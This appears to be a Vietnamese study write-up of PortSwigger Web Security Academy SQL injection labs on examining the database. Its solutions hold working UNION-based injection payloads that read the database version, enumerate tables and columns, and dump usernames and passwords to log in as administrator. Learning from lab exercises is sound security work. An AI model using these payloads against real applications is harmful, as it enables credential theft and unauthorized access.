1. Lý thuyết<br>
- ngôn ngữ SQL đc triển khai theo cách giống nhau trên các nền tảng database phổ biến, nhiều cách để pháp hiện và khai thác vul tiêm SQL hoạt động giống nhau trên các loại database khác nhau
- tuy nhiên vẫn tồn tại sự khác nhau (đọc thêm: SQL injection cheat sheet)
- sau khi xác định vul tiêm SQL, lấy in4 từ database là hữu ích để khai thác vul<br>

I. Querying the database type and version<br>
1. Lý thuyết<br>
+ Microsoft, MySQL	SELECT @@version
+ Oracle	SELECT * FROM v$version
+ PostgreSQL	SELECT version()<br>

2. Lab: SQL injection attack, querying the database type and version on Oracle<br>
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.<br>
https://portswigger.net/academy/labs/launch/974bd9df06352f8b59c679f854a5bc7e3db6c7fb83f72db653509252a6d47e28?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-oracle<br>

3. Giải<br>
+ 2 cột đều thỏa mãn
+ lấy in4 version trên Oracle -> cột BANNER
+ [https://0a16005104b45b0a8096e9dc000c0001.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%20%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--](https://0a1e00a7041913a380a8c6e800ea00b2.web-security-academy.net/filter?category=Accessories%20%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--)
+ NULL dùng để đảm bảo số cột<br>

4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft<br>
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.<br>

5. Giải<br>
+ trong MySQL comment cần (#) or (--) đi kèm khoảng trắng
+ dùng burpsuite chặn truy cập và chỉnh sửa<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/f382f7e1-6418-4579-94a5-433aacb0c088)<br>

-> phát hiện 2 cột can tạo string<br>
+ GET /filter?category=Accessories 'UNION+SELECT+@@version,+NULL<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/cbb334ed-0fc2-4f67-a415-1908ec0110ad)<br>

II. Listing the contents of the database<br>
1. Lý thuyết<br>
+ SELECT * FROM information_schema.tables -> xem danh sách bảng<br>
-> có các cột: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE<br>
+ SELECT * FROM information_schema.columns WHERE table_name = 'Users' -> xem danh sách các cột của bảng có tên Users<br>
-> có các cột: TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE<br>

2. Lab: SQL injection attack, listing the database contents on non-Oracle databases<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned
in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords.
You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
To solve the lab, log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/81986add1fa6ec438867539cc2f562f01dcf9faf6a0b82766269c3dbeef30b00?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-non-oracle<br>

3. Giải<br>
+ tìm ra số cột có là 2 cột và cả 2 cột can tạo string
+ liệt kê tên table trong database: GET /filter?category=Gifts 'UNION SELECT table_name,NULL FROM information_schema.tables-- <br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/7bd412c2-b6fb-4744-a884-3da828b8fedb)<br>

+ tìm ra đc bảng: users_fwaatj -> tìm các cột trong bảng này
+ truy vấn: GET /filter?category=Gifts 'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_fwaatj'<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/225db2b5-68e1-4794-8f08-02fc6886cac4)<br>

+ lấy username, password từ bảng này: GET /filter?category=Gifts 'UNION SELECT password_mduiwb,username_flbaww FROM users_fwaatj-- <br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/06c99c83-2cd2-485a-9bc9-c5d3b8d6083c)<br>

+ login tài khoản administrator<br>

III. Listing the contents of an Oracle database<br>
1. Lý thuyết<br>
+ liệt kê all bảng: SELECT * FROM all_tables
+ liệt kê cột trong bảng: SELECT * FROM all_tab_columns WHERE table_name = 'USERS'<br>

2. Lab: SQL injection attack, listing the database contents on Oracle<br>
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned
in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to
determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
To solve the lab, log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/de4256d42cc604a2a3f7e792c5fff88df1712f1537cd506ed2537efedbd4c665?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-oracle<br>

3. Giải<br>
+ tìm số cột có và can tạo string: GET /filter?category=Corporate+gifts 'UNION+SELECT+'a','a' FROM dual-- <br>
-> có 2 cột<br>
+ liệt kê all bảng: GET /filter?category=Corporate+gifts 'UNION SELECT table_name,NULL FROM all_tables--<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8ead9a62-f64a-4580-9e1e-221e3034463c)<br>

+ tìm ra đc bảng: USERS_DFIRUZ<br>
-> tìm các cột trong bảng: GET /filter?category=Corporate+gifts 'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_DFIRUZ'-- <br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/a79ed34f-424c-491f-a852-a14ad36bf1f1)<br>

+ lấy in4 từ các cột: GET /filter?category=Corporate+gifts 'UNION SELECT PASSWORD_NQTQDP,USERNAME_LKBOQS FROM  USERS_DFIRUZ-- <br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/0bc7ddd6-8141-4eda-9184-7abf2d486122)<br>

+ login tài khoản administrator<br>






